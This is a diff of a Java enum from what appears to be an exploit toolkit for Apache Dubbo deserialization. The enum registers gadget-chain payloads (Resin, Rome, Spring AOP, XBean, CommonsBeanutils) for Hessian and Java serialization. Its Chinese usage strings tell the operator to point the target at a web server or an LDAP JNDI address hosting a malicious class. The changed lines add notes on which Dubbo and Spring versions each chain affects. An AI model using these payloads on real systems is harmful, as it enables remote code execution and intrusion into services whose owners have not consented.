@@ -26,10 +26,10 @@ import com.threedr3am.exp.dubbo.payload.java.URLDNS;
  * @author threedr3am
  */
 public enum Payloads {
-  RESIN("resin", 2, new ResinPoc(), "arg[0]=恶意类所在web服务器ip，例：http://127.0.0.1:8080/，arg[1]=恶意类类名，此处需要恶意类无包名编译出来的", "hessian", "com.caucho:quercus:*"),
-  ROME("rome", 1, new RomePoc(), "arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）", "hessian", "com.rometools:rome:*"),
-  SPRING_AOP("spring-aop", 1, new SpringAbstractBeanFactoryPointcutAdvisorPoc(), "arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）", "hessian", "org.springframework:spring-aop"),
-  XBEAN("xbean", 2, new XBeanPoc(), "arg[0]=恶意类所在web服务器ip，例：http://127.0.0.1:8080/，arg[1]=恶意类类名，此处需要恶意类无包名编译出来的", "hessian", "org.apache.xbean:xbean-naming:*"),
+  RESIN("resin", 2, new ResinPoc(), "arg[0]=恶意类所在web服务器ip，例：http://127.0.0.1:8080/，arg[1]=恶意类类名，此处需要恶意类无包名编译出来的", "hessian", "com.caucho:quercus:*     dubbo版本<=2.7.5"),
+  ROME("rome", 1, new RomePoc(), "arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）", "hessian", "com.rometools:rome:*     dubbo版本<=2.7.5"),
+  SPRING_AOP("spring-aop", 1, new SpringAbstractBeanFactoryPointcutAdvisorPoc(), "arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）", "hessian", "org.springframework:spring-aop     受Spring版本限制"),
+  XBEAN("xbean", 2, new XBeanPoc(), "arg[0]=恶意类所在web服务器ip，例：http://127.0.0.1:8080/，arg[1]=恶意类类名，此处需要恶意类无包名编译出来的", "hessian", "org.apache.xbean:xbean-naming:*     dubbo版本<2.7.5"),
 
   CommonsBeanutils("CommonsBeanutils", 1, new CommonsBeanutils(), "arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）", "java", ""),
   CommonsBeanutils1("CommonsBeanutils1", 1, new CommonsBeanutils1(), "arg[0]=cmd", "java", "commons-beanutils:commons-beanutils:1.9.2"),
